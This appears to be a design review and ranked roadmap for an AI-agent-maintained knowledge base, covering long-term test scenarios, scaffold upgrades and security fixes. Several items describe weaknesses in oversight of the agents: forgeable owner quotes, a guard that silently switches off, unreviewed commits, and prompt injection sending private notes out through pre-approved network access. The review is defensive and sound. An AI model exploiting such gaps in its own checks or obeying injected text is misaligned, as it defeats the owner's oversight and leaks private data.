- Sessions include: routine ingests, 25 questions per quarter, two audits, three refactors, a charter change (scope narrows, so existing notes become out of scope), a second person filing in a parallel clone followed by a git merge, and a scaffold upgrade in month 9 using the mechanism in section 6.
- Traps: a value that changes and changes back; a fact that goes stale with no announcement (only an audit can find it); two entities that are renamed; a claim that should be flagged stale and 20 `since <old date>` claims that should not; 50 open questions of which 40 get resolved.
- Metrics and thresholds, each against the hidden timeline at the session's date:
  - current claims that are wrong at that date: at most 3%;
  - changed facts whose old value is still current after the announcing source was ingested: 0;
  - STALE flag precision at least 80% and recall at least 80%;
  - duplicate claim pairs: at most 1%;
  - answer accuracy at least 95% on 100 questions, including 20 "what was it before";
  - OPEN flags pointing at resolved disputes: 0;
  - tokens per filed claim flat (within 25%) between month 1 and month 18;
  - `check` under 15 s and `search` under 3 s at final size;
  - upgrade: `check` clean and the same golden score before and after, no owner file overwritten;
  - merge of two clones: no lost history entries, `check` clean.
- Models: Sonnet for all roles, plus one Haiku run of the first 12 sessions.

"Optimal" is then a concrete statement: case A passes on both operating systems, case B meets its thresholds on a held-out mutation set with no further fixes, and case C holds its accuracy and cost numbers from month 1 to month 18.

---

## 6. Long-term life and scaffold updates

### 6.1 Year-two risks not covered above
- **Index and flat structure**: `index.md` is unusable long before 1,000 notes (3.1). Hubs and folders are proposal-driven, which is right, but nothing bounds hub size either.
- **Convention changes**: `CONVENTIONS.md` changes by proposal, but old notes are never migrated, and `check` enforces only the current rule set. Any tightening (for example quotes on all claims) fails on the whole back catalogue at once. `check` needs a "since <date>" or `--baseline` mode: new rules are failures for changed notes and warnings for untouched ones.
- **Charter change**: when scope narrows, nothing finds the notes that no longer pass. Add an audit step that re-runs the admission test on a sample per type and proposes archiving.
- **Unbounded files**: `meta/log.md`, `open-questions.md`, `search-misses.log`, `requests.log`, `inbox/processed/` and `meta/audits/` only grow. The design doc mentions pruning after 90 days; no code or skill does it.
- **Several people**: owner quotes carry no identity (`[src: user <date>]`), tier 1 is "the owner", the guard state lives in each clone's `.git`, and generated files (`index.md`) conflict on merge. Minimum: `[src: user:<name> <date> ...]`, never commit `index.md` (generate it), and run `check` as a merge gate.
- **Role change of the owner**: handled by re-running init-kb, which rewrites the charter but not the notes (see charter change).

### 6.2 Getting scaffold updates without a git link

Proposal: a versioned scaffold with a file manifest and an upgrade command that fetches a tagged archive, the same way `create_kb.py` does.

1. **Version and manifest.** `create_kb.py` writes `.akb/version` (the tag) and `.akb/manifest.json`: for every scaffold-owned file, its path and the hash it had at that version. The template repo gets tags and a `CHANGELOG.md`.
2. **Separate what the owner changes from what the scaffold owns.**
   - Scaffold-owned, replaceable: `tools/kb.py`, `kbsem.py`, `fetch.py`, `tools/hooks/*`, the stock agents and skills, the hook section of settings.
   - Owner-owned, never touched: `charter.md`, `kb.toml` (types, review days, phrases, margins: F5), notes, sources, meta, toolsmith-written tools and skills (not in the manifest, so never touched).
   - `CLAUDE.md` splits in two: the project block stays in `CLAUDE.md`, the rules move to a scaffold-owned file that `CLAUDE.md` imports with `@`.
3. **`uv run tools/kb.py upgrade [--to <tag>] [--dry-run]`** (owner-run, in their terminal):
   - downloads the template archive for the tag;
   - for each scaffold file: if the local hash equals the manifest hash, replace it; if the owner or toolsmith changed it, write `<file>.new`, leave the local file, and list it for a manual or agent-assisted merge;
   - merges `settings.json` by key (hooks and stock permissions replaced, the owner's extra rules kept);
   - runs numbered, idempotent migrations (`migrations/004_claim_ids.py` and so on) for every version between the old and the new one; each migration has a dry-run and writes history where it changes notes;
   - runs `check` and the golden questions before and after, and refuses to finish if the score drops;
   - commits everything as one commit, `kb: upgrade scaffold v4.1 -> v5.0`, so `git revert` is the rollback.
4. **Notification without a schedule.** The SessionStart `stats` output prints the installed version. The upgrade is pulled only when the owner asks; an optional `kb.py upgrade --check` compares against the latest tag on request.

The upgrade must be tested like any other feature: case C includes one.

---

## 7. Ranked roadmap

MUST = fix before anyone relies on this for real work. Cost: S under 2 hours, M half a day, L a day or more.

| # | Change | Why | Expected effect | Cost | How to verify |
|---|---|---|---|---|---|
| 1 MUST | Per-statement owner files written by the UserPromptSubmit hook; `freeze` for files and command output; drop the "any past M commit" rule (F1, T1) | Second capture of a day breaks check; owner quotes and local sources are model-typed | No deadlock; owner and local evidence unforgeable | M | Replay: 3 captures with commits in between, check clean; a claim quoting words the owner never typed fails |
| 2 MUST | Refresh the manifest from the librarian's own PostToolUse; clear matched violations; set `CLAUDE_CODE_FORK_SUBAGENT=0` (F2, F3) | False violations destroy librarian work; stale ones block it for ever | Guard correct under background subagents and interrupts | S | Replay harness; case A interrupted-librarian scenario |
| 3 MUST | Add `PowerShell` to matchers and permissions (F4) | Guard and allow list do not apply on Windows | Same protection on all platforms | S | Case A on Windows: trace shows hooks on PowerShell calls |
| 4 MUST | Review ledger plus commit gate in the guard (S2, T7) | Review and commit order are prose | "Every filing reviewed" becomes a guarantee | M | Commit before review is blocked; approved digest commits; pure move commits |
| 5 MUST | Close the exfiltration channels: embedding config outside the repo or `.env` protected; fetch host list and query-string limit; re-check redirects (T11) | Pre-approved network egress plus untrusted text plus private notes | Injection cannot send notes out without a prompt | M | Injection sources in case B: 0 egress in `fetch.log` and the trace |
| 6 MUST | Evidence checks: quote on every citation; full-bullet comparison in `verify`; per-file `precheck`; history append-only (T2, T4, T5, T6) | Four confirmed holes | Reviewer sees every evidence change; no silent loss | S | The four reproductions in this report become failing tests, then pass |
| 7 MUST | Move TYPES, REVIEW_DAYS, PHRASES and thresholds to `kb.toml`; fix init-kb (F5) | init-kb cannot do what it says | Init works; `tools/` becomes replaceable | S | Init session adds a type with no guard block |
| 8 | Shrink the Bash pre-check to redirects and kb verbs; relax `capture.py` (1.4) | False blocks train users to disable the guard | At most 1 false block per 10 ordinary commands | S | The command list in 1.4 as a test |
| 9 | Fix freshness and close open items (T8, T9, S5) | STALE and OPEN flags are wrong or permanent | Flags carry information again | M | Case C staleness precision and recall at least 80% |
| 10 | `onFailure: block` plus heartbeat check (F6) | Guard silently off when `uv` is missing; harness never ran hooks | Missing hooks become a check failure | S | Remove `uv` from PATH for the hook: tool call blocked; stale heartbeat fails check |
| 11 | Transactional verbs (`supersede`, `add-claim`, `merge-cite`, `verdict`, `forget`, `next`) and drop `index.md` from the librarian's reading (S3, 3.2) | Forty prose obligations; history was 4 of 6 | Shorter prompts, history by construction | L | Case B: history completeness 100%; librarian tokens per claim fall |
| 12 | Reviewer flags in the verify pack and canary claims (T3, S6) | Wrong entity, unit and date pass; reviewer vigilance unmeasured | Catch rate measured on every filing | M | Case B per-class catch rates |
| 13 | Forget-check over the whole tree; stop logging misses to a tracked file (T10) | Forget leaks the forgotten words | Forget is complete in the working tree | S | `git grep` after a forget returns nothing |
| 14 | Version stamp, manifest, `kb.py upgrade`, migrations, baseline mode for check (6) | No update path | Existing KBs can take fixes 1-13 | L | Case C upgrade step |
| 15 | Semantic: calibrate to a 5% bound, loose gate for `similar`, separate block for meaning-only hits, chunked vectors, recalibrate on growth (5.3, 4) | Strict gate costs recall for no measurable gain; memory at scale | Better recall where it protects accuracy | M | Case B ask test; memory under 500 MB at 60k units |

Items 1-7 are the must-fix list. Items 8 and 10 are small enough to ship with them. After that, run case A before building 11-15, because a live run may reorder them.
